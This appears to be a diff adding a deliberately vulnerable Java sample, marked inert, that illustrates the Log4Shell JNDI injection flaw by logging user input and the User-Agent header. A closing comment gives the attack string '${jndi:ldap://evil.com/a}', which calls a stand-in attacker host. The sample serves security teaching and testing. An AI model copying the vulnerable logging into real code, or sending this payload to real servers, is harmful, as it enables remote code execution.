@@ -1,0 +1,33 @@
+/*
+ * INERT — DO NOT RUN
+ * 
+ * CVE-2021-44228: Log4Shell JNDI Injection
+ * CWE-502: Deserialization of Untrusted Data
+ * OWASP: A06:2021 – Vulnerable and Outdated Components
+ * 
+ * Vulnerability: Log4j JNDI lookup allows remote code execution
+ * Source: Apache Log4j versions 2.0-beta9 through 2.14.1
+ */
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class VulnerableLogging {
+    private static final Logger logger = LogManager.getLogger(VulnerableLogging.class);
+    
+    // VULNERABLE: User input directly logged
+    public void logUserInput(String userInput) {
+        logger.info("User provided: {}", userInput);
+    }
+    
+    // VULNERABLE: HTTP header logging
+    public void logRequest(HttpServletRequest request) {
+        String userAgent = request.getHeader("User-Agent");
+        logger.error("Request from: " + userAgent);
+    }
+}
+
+/*
+ * Attack vector: "${jndi:ldap://evil.com/a}"
+ * Impact: Remote code execution via JNDI lookup
+ */
